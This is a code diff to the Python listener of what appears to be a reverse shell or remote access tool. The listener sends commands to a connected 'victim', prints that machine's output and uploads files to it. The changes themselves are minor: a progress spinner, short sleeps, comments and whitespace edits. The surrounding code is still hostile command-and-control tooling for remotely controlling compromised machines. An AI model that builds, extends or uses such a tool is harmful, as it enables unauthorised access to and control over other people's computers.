@@ -182,6 +182,8 @@ class Listener:
 
     
     def executeCmd(self,cmd):
+        spinner = multiprocessing.Process(target=self.spinner)
+        spinner.start()
         #cmd = str(cmd).encode('utf-8')
         ##print('executeCmd')
         ##print(cmd)
@@ -191,6 +193,7 @@ class Listener:
         #result = self.connection.recv(1024)
         #result = result.decode()
         time.sleep(1)
+        spinner.terminate()
         return self.recvStream() #calling.executeCmd will return the result of the command sent by run()
 
 
@@ -201,7 +204,7 @@ class Listener:
             ##print(cmd)
             cmd = cmd.split(' ')
             ##print(cmd[0])
-                   
+    
             if cmd[0] == '':
                 #print(cmd)
                 cmd[0] = "\r\n" 
@@ -212,8 +215,7 @@ class Listener:
                 print(f'{fc.purple}#{fc.end}'*100)
           
             elif cmd[0] != 'bye':
-
-                            
+      
                 if cmd[0] == 'download':
                     
                     try:
@@ -233,27 +235,29 @@ class Listener:
                         cmd.append(readFileDict) 
                         #print(cmd[2][cmd[1]]) 
                         #print(cmd[2] == None) 
+                        
                         if cmd[2] != None:
-                            print(f'{fc.r}Uploading: {cmd[1]}{fc.end}\n{fc.r}Bytes: {fc.g}{self.getSize(cmd[1])}{fc.end}')
+                            print(f'{fc.r}Uploading: {cmd[1]}{fc.end}\n{fc.r}Bytes: {fc.g}{self.getSize(cmd[1])}{fc.end}') #getsizeof uses os module to get binary length of a file 
                             spinner.start()
                             self.sendStream(cmd)
                             recv = self.recvStream()
+                            time.sleep(1)
                             spinner.terminate()
                             recv = recv['data']
                             print(f'{fc.purple}#{fc.end}'*100)
                             print(f'{fc.b}{recv}{fc.end}')
                             print(f'{fc.purple}#{fc.end}'*100)
+                    
                     else:
                         print(f'{fc.purple}File name required.{fc.end}')
 
                 else:
                     result = self.executeCmd(cmd)   
-                    print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
+                    print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long') #using utf8len function to get the byte length of a string
                     print(f'{fc.purple}#{fc.end}'*100)
                     print(f'{fc.b}{result}{fc.end}')
                     print(f'{fc.purple}#{fc.end}'*100)
             
-
             else:
                 print(f'{fc.rw}Exit call received, closing connection{fc.end}')
                 self.sendStream(cmd)
